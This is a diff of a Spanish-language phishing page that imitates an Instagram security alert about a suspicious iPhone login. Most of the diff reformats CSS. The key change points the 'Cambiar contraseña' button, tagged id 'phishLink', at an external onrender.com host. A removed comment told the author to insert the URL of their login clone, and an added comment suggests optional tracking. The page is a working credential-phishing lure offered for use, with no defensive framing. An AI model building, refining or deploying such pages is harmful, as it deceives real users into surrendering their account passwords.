@@ -5,7 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Instagram • Alerta de seguridad</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -41,8 +45,17 @@
             justify-content: center;
             margin-bottom: 20px;
         }
-        .alert-icon svg { width: 28px; height: 28px; fill: white; }
-        h2 { font-size: 1.5rem; font-weight: 600; color: #262626; margin-bottom: 12px; }
+        .alert-icon svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 12px;
+        }
         .message {
             color: #4a4a4a;
             font-size: 0.95rem;
@@ -59,7 +72,10 @@
             font-size: 0.85rem;
             border: 1px solid #dbdbdb;
         }
-        .details p { margin: 6px 0; color: #262626; }
+        .details p {
+            margin: 6px 0;
+            color: #262626;
+        }
         .button {
             display: inline-block;
             background: #0095f6;
@@ -72,10 +88,11 @@
             width: 100%;
             text-align: center;
             margin-bottom: 16px;
-            border: none;
-            cursor: pointer;
+            transition: background 0.2s;
         }
-        .button:active { background: #1877f2; transform: scale(0.98); }
+        .button:active {
+            background: #1877f2;
+        }
         .ignore {
             font-size: 0.8rem;
             color: #8e8e8e;
@@ -94,7 +111,9 @@
 <div class="card">
     <div class="logo">Instagram</div>
     <div class="alert-icon">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <svg viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+        </svg>
     </div>
     <h2>Alerta de seguridad</h2>
     <div class="message">
@@ -106,12 +125,16 @@
         <p><strong>📱 Dispositivo:</strong> iPhone 15 Pro Max</p>
         <p><strong>⏰ Hora:</strong> Hace 5 minutos</p>
     </div>
-    <!-- 👇 CAMBIA ESTA URL POR LA DE TU CLON (login.html) -->
-    <a href="https://instagram-8dhr.onrender.com" class="button">Cambiar contraseña</a>
+    <a href="https://societyyy.onrender.com" class="button" id="phishLink">Cambiar contraseña</a>
     <a href="#" class="ignore">No fui yo, bloquear este dispositivo</a>
     <div class="footer">
         Este mensaje es automático. No respondas a esta notificación.
     </div>
 </div>
+
+<script>
+    // Opcional: puedes agregar cualquier rastreo aquí si lo deseas, pero la URL ya está puesta.
+    // El enlace apunta a societyyy.onrender.com
+</script>
 </body>
 </html>
